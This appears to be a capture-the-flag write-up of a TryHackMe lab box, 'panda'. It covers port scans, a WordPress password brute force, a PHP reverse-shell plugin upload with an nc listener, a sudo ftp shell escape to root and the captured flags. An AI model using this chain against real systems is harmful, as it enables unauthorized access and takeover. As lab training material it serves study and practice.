
THM KOTH: panda
==================
> labruhtooryboi | December 5, 2020





# 10.10.131.68
# panda.thm


					# reconnisance

'''
rustscan -a 10.10.131.68

Open 10.10.131.68:22
Open 10.10.131.68:53
Open 10.10.131.68:80
Open 10.10.131.68:139
Open 10.10.131.68:445
Open 10.10.131.68:1337
Open 10.10.131.68:3306
Open 10.10.131.68:8009
Open 10.10.131.68:8080
Open 10.10.131.68:9999
'''



'''
nmap -sC -sV -v -oN nmapinit.txt 10.10.131.68

Nmap scan report for 10.10.131.68
Host is up (0.24s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 af:ff:dd:8f:74:ef:1b:ea:3a:33:7c:df:a0:e8:35:08 (RSA)
|   256 b5:dc:77:c4:15:a4:b6:5e:f3:07:46:ad:90:ea:d6:59 (ECDSA)
|_  256 a5:20:b4:a0:94:2a:27:f2:c9:ea:cb:09:f8:ab:f0:a6 (ED25519)
53/tcp   open  domain      ISC BIND 9.11.4-P2 (RedHat Enterprise Linux 7)
| dns-nsid: 
|_  bind.version: 9.11.4-P2-RedHat-9.11.4-9.P2.el7
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)
3306/tcp open  mysql       MariaDB (unauthorized)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.92
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sun, 06 Dec 2020 00:24:16 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sun, 06 Dec 2020 00:24:15 GMT
|_    Content-Length: 0

Service Info: Host: PANDA; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:7

'''




					# enumeration




'''
smbclient //panda.thm/anonymous
(no passwd)

get binary
strings binary
'''


'''
gobuster dir -u http://panda.thm/ -u /usr/share/wordlists/dirb/big.txt -o gob1.txt

/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
/flag (Status: 301)
/robots.txt (Status: 200)
/wordpress (Status: 301)
'''




					# extended enumeration(internet)
					
'''
wpscan --url http://panda.thm/wordpress/ --passwords /usr/share/wordlists/rockyou.txt > wpscan.txt



[!] Valid Combinations Found:
 | Username: po, Password: password1

'''




					# exploitation

'''
*when in admin panel, add a new plugin
*making a plugin (need a zip file format)

zip rphp3.zip rphp3.php
'''

'''
nc -lvnp 1234

*upload and activate plugin
'''



					# privelage escalation
					
'''
*do not stabilize shell!!!
sudo -l

*can run ftp without a passwd
'''

'''
sudo ftp
!/bin/bash
'''

'''
passwd
toortoor
'''

'''
ssh root@$IP
passwd: toortoor
'''






					# interesting things

>flags
'''
http:/ipanda.thm/flag/
*decode: hex --> base64 --> output

d220a54fb2f0f088e7eb634fadcdd97f
'''

'''
*binary from anon smb share
strings binary

6333685ba4ed33ed2a1836ae30c99fd6
'''

'''
/home/po/flag.txt

MGNlMTZmYjFiYmM1ODY2OTczY2JlZmNlNjY4YTJmYTcK
'''

'''
/home/shifu/flag.txt

YzIzOGI2MzNkNTExOTM3NGYyMmQwNzk4Y2Q5ZDkzOGIK
'''

'''
/home/tigress/flag.txt

Mzk3NGRkYWFmM2RjM2ViOGU0NjZlNWQ2YjMyNDZjNWEK
'''




>users

'''
root
po
shifu
tigress
'''

>passwds

'''
*didnt need any to get on box 
'''



>files and dirs

'''
http:/ipanda.thm/flag/
/home/tigress/flag.txt
/home/shifu/flag.txt
/home/po/flag.txt

*anon smb share
binary 
'''


>root stuff 


'''
/etc/passwd

'''

'''
/etc/shadow
'''
